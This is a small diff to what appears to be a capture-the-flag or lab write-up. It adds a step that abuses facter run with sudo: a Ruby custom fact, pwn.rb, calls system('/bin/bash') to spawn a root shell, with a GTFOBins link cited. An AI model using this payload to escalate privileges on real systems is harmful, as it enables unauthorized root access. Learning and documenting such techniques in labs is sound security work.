@@ -413,6 +413,17 @@ so If I can make facter execute Ruby code and I run facter with sudo, then my Ru
 
 Resource[https://gtfobins.org/gtfobins/facter/]
 
+now making file in /tmp
+
+nano pwn.rb
+
+Facter.add(:pwn) do
+  setcode do
+    system("/bin/bash")
+  end
+end
+
+and save it then 
 ```
 
 
